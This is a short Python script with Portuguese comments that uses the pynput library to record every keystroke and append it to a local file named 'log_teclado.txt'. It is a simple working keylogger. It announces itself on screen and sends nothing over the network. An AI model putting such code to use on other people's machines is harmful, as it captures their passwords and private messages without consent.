from pynput.keyboard import Listener

arquivo_log = "log_teclado.txt"

def capturar(tecla):
    tecla_limpa = str(tecla).replace("'", "")
    
    # Ajustar teclas especiais
    if tecla_limpa == "Key.space": tecla_limpa = " "
    if tecla_limpa == "Key.enter": tecla_limpa = "\n"
    
    with open(arquivo_log, "a") as log:
        log.write(tecla_limpa)

print("Monitorando teclado... (Pressione Ctrl+C para parar)")
with Listener(on_press=capturar) as escutador:
    escutador.join()